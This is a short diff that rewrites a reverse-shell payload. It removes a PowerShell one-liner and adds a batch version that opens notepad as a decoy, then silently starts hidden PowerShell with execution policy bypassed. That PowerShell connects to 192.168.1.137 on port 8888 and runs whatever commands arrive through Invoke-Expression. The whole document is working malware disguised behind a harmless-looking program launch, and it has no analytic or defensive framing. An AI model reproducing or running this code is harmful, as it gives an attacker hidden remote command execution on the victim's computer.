@@ -1,3 +1,3 @@
-notepad;
-$TCPClient = New-Object Net.Sockets.TCPClient('192.168.1.137', 8888);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()
-  
+@echo off
+notepad
+powershell -NoProfile -W Hidden -ExecutionPolicy Bypass -Command "$tcp = New-Object Net.Sockets.TCPClient('192.168.1.137', 8888);$s=$tcp.GetStream();$w=New-Object IO.StreamWriter($s);function W($s){$w.Write($s+'SHELL>');$w.Flush()}W'';while($tcp.Connected){$b=New-Object byte[] $tcp.ReceiveBufferSize;$r=$s.Read($b,0,$tcp.ReceiveBufferSize);if($r -gt 0){$c=([text.encoding]::UTF8).GetString($b,0,$r-1);$o=try{Invoke-Expression $c 2>&1|Out-String}catch{$_|Out-String}W($o)}else{break}}$w.Close()"
